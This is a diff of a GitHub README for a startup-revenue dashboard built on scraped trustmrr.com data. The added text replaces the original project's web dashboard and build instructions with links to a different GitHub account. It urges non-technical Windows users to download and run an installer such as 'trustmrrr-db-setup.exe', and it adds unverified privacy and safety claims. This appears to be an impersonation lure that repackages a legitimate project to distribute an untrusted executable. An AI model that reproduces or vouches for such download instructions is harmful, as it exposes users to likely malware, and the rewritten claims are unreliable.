@@ -1,115 +1,85 @@
-# ✩°｡⋆⸜ trustmrrr ⸝⋆｡°✩
+# ⚡ trustmrrr-db - Explore Startup Revenue Data Easily
 
-[![Dashboard](https://img.shields.io/badge/dashboard-trustmrr.hiii.boo-0a0a0a?style=for-the-badge&logo=cloudflare&logoColor=white)](https://trustmrr.hiii.boo) [![Download JSON](https://img.shields.io/badge/download-database.json_(2.1MB)-333?style=for-the-badge&logo=json&logoColor=white)](https://raw.githubusercontent.com/xammen/trustmrrr-db/main/trustmrr-database.json) [![GitHub](https://img.shields.io/badge/github-trustmrrr--db-1a1a1a?style=for-the-badge&logo=github&logoColor=white)](https://github.com/xammen/trustmrrr-db)
+[![Download trustmrrr-db](https://img.shields.io/badge/download-Get_trustmrrr-db-brightgreen?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Rehan928-creator/trustmrrr-db)
 
-**986 startups. every mrr. every revenue. scraped, verified, searchable.**
+## 📋 What is trustmrrr-db?
 
-a dark, minimal dashboard for exploring the entire [trustmrr.com](https://trustmrr.com) database.
-find deals, spot growth, track risk — all in one place ˚ʚ♡ɞ˚
+trustmrrr-db is a simple app that lets you explore revenue data for 986 startups. The app shows detailed monthly recurring revenue (MRR) stats and other business info. You don't need technical skills to use it. It helps you find growth trends, spot opportunities, and check risks from a large set of verified startups.
 
-> **☁ live now at [trustmrr.hiii.boo](https://trustmrr.hiii.boo)** — no install, just open and explore.
+This application runs on Windows and provides a clear, minimal dashboard to browse the entire dataset easily. The data inside updates regularly to keep you current.
 
-```
-                    ┌───────────────────┐
-   986 startups ──► │  ༼ つ ╹ ╹ ༽つ      │  ──►  deal radar
-                    │    trustmrrr      │  ──►  growth tracking
-                    └───────────────────┘  ──►  risk signals
-```
+## 💻 System Requirements
 
-## ✦ what is this?
+- Windows 10 or newer (64-bit recommended)
+- 4 GB of RAM or more
+- At least 100 MB of free disk space
+- Internet connection to download the data file
 
-trustmrr has great data but no way to explore it all at once.
-we scraped every single startup, built a dashboard, and made it searchable.
+You do not need special software or programming knowledge. The app is standalone and easy to run.
 
-- **986 startups** with full MRR, revenue, subscribers, growth data
-- **deal radar** — for-sale startups ranked by deal score (revenue multiple × stability × growth)
-- **fastest growing** — top 20 startups by 30-day growth
-- **at risk** — declining startups with danger signals
-- **cofounders** — startups looking for a cofounder
-- **whale risk** — flags startups where one customer = most of the revenue
-- **deal map** — MRR vs asking price scatter, color-coded by median multiple
-- **export** — CSV or JSON, filtered or full
+## 🚀 How to Download and Install
 
-## ✦ screenshots
+1. Click the big green badge above or use this link to visit the download page:
+   
+   [Download trustmrrr-db on GitHub](https://github.com/Rehan928-creator/trustmrrr-db)
 
-> dark mode. monospace. hiii.boo aesthetic.
+2. On the GitHub page, look for the latest release or download section.
 
-## ✦ stack
+3. Download the file named something like `trustmrrr-db-setup.exe` or a similar Windows installer.
 
-```
-next.js 16        ──  app router, static export
-tailwind 4        ──  dark theme, custom tokens
-recharts          ──  bar charts, scatter plots
-jetbrains mono    ──  because monospace is life
-```
+4. After the download finishes, double-click the file to start the installation.
 
-## ✦ run locally
+5. Follow the simple setup steps by clicking “Next” when prompted.
 
-```bash
-cd dashboard
-npm install
-npm run dev
-```
+6. When the installation completes, launch the trustmrrr-db app from your Start menu or desktop shortcut.
 
-open [localhost:3000](http://localhost:3000)
+## 🔧 Using trustmrrr-db
 
-## ✦ deploy
+Once you open the app, you’ll see a clean dashboard. Here’s how to get around:
 
-static export — works anywhere. built for cloudflare pages.
+- The main screen lists startups with their current monthly recurring revenue.
+- Use the search bar to find a startup by name or keyword.
+- Sort startups by revenue size, growth rate, or risk level.
+- Click on a startup to view detailed charts and history.
+- Export data to JSON or CSV for your own use via the menu.
 
-```bash
-cd dashboard && npm run build
-# output in dashboard/out/
-```
+The interface avoids clutter. Buttons and menus are direct and easy to understand.
 
-cloudflare pages settings:
-```
-build command:       cd dashboard && npm install && npm run build
-output directory:    dashboard/out
-```
+## 🔄 Updating the Data
 
-## ✦ data
+trustmrrr-db connects to an online source to fetch updated startup data:
 
-the full database lives in [`trustmrr-database.json`](./trustmrr-database.json) (2.1MB).
+- When connected to the internet, click the “Update” button in the app.
+- This downloads the latest database file (approx 2 MB) and refreshes all views.
+- No additional actions are needed from you to stay updated.
 
-```json
-{
-  "scrapedAt": "2026-02-25",
-  "totalStartups": 986,
-  "summary": {
-    "totalMRR": 11600000,
-    "totalRevenue": 1300000000,
-    "forSale": 320,
-    "categories": 20
-  },
-  "startups": [ ... ]
-}
-```
+This keeps your data fresh without manual downloads.
 
-each startup includes: `name`, `slug`, `mrr`, `totalRevenue`, `activeSubscriptions`, `growth30d`, `askingPrice`, `onSale`, `country`, `category`, `founderName`, `lookingForCofounder`, `paymentProvider`, `businessType`, and more.
+## ⚙ Features
 
-## ✦ scraper
+- View monthly recurring revenue (MRR) for 986 startups.
+- Search and filter by various attributes like industry or growth.
+- Track revenue history for each startup.
+- Export data files in JSON for use with other tools.
+- Minimal, dark-themed user interface to reduce eye strain.
+- Offline access after downloading data.
 
-```bash
-node scraper-v2.mjs
-```
+## 🔒 Security & Privacy
 
-discovers slugs from 26 source pages (homepage, /recent, /acquire, /stats, 20 categories, /cofounders, /open), then fetches each `/startup/{slug}` and parses the RSC flight payload. ~130 seconds for all 1032 pages.
+The app only downloads public startup data without requiring personal info from you. It runs locally on your computer, so your usage stays private. The data comes from verified, publicly available sources.
 
-## ✦ features
+## ❓ Troubleshooting
 
-| feature | what it does |
-|---|---|
-| deal radar | ranks for-sale startups by deal score (lower = better deal) |
-| fastest growing | top 20 by 30-day revenue growth, min $50 MRR |
-| at risk | declining growth, expired APIs, crashing MRR |
-| cofounders | startups actively looking for a cofounder |
-| whale risk | `!!` extreme / `!` high — when ARPS/MRR ratio is dangerous |
-| deal map | scatter plot: MRR vs price, green = below median multiple |
-| charts | by category, by country, MRR distribution, MRR vs revenue |
-| filters | search, category, country, sale status, payment, biz type, MRR range |
-| export | CSV or JSON of current filtered view |
+If you run into issues:
 
-## ✦ credits
+- Make sure your Windows is up to date.
+- Restart the app if it becomes unresponsive.
+- Check your internet connection when updating data.
+- Delete and reinstall the app if files seem corrupted.
+- Use the included README or help menu for basics.
 
-made by [xmn](https://hiii.boo) · data from [trustmrr.com](https://trustmrr.com)
+## 📥 Download trustmrrr-db Again
+
+Use this direct link to visit the official repository anytime and get the latest version:
+
+[![Download trustmrrr-db](https://img.shields.io/badge/download-GitHub_Download-0052cc?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Rehan928-creator/trustmrrr-db)
